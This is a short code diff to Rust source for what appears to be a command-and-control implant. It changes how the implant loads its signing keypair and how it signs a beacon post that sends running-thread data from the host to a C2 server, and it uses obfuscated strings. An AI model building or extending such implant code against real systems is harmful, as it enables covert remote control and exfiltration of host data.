@@ -440,7 +440,14 @@ impl LinkFetch for HTTPPostC2Link {
             running_thread_string.push(thread.string_payload_compact());
         }
 
-        let key_pair: signature::Ed25519KeyPair = signature::Ed25519KeyPair::from_pkcs8(config.loader_keypair.as_ref()).unwrap();
+        let key_pair: signature::Ed25519KeyPair = match signature::Ed25519KeyPair::from_pkcs8(config.loader_keypair.as_ref()){
+            Ok(key_pair) => key_pair,
+            Err(error) => bail!(
+                "{}{}",
+                encrypt_string!("loader_keypair use: "),
+                error
+            ),
+        };
         let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
 
         let mut post_data: PostToC2 = PostToC2{
@@ -457,7 +464,7 @@ impl LinkFetch for HTTPPostC2Link {
             sign_bytes: vec![],
         };
 
-        let sign_data = format!("sign_data: {:?}", post_data);
+        let sign_data = format!("{:?}", post_data);
         let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
         let sign_bytes = sig.as_ref().to_vec();
         post_data.peer_public_key_bytes= peer_public_key_bytes;
@@ -492,9 +499,4 @@ impl LinkFetch for HTTPPostC2Link {
     }
 }
 
-        // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
-        //map.insert("config", format!("{:?}", config));
-        // TODO, il faudrait l'extraire de la config, on pourrait ajouter un nom a chaque config
-        //map.insert("loader", "todo".to_string());
-        //TODO send real data
-        //map.insert("working-link", "todo".to_string());
+// TODO reflechir. est-ce qu'on envoit la config actuelle ?? c'est lourd et il faudrait la chiffrer a fond
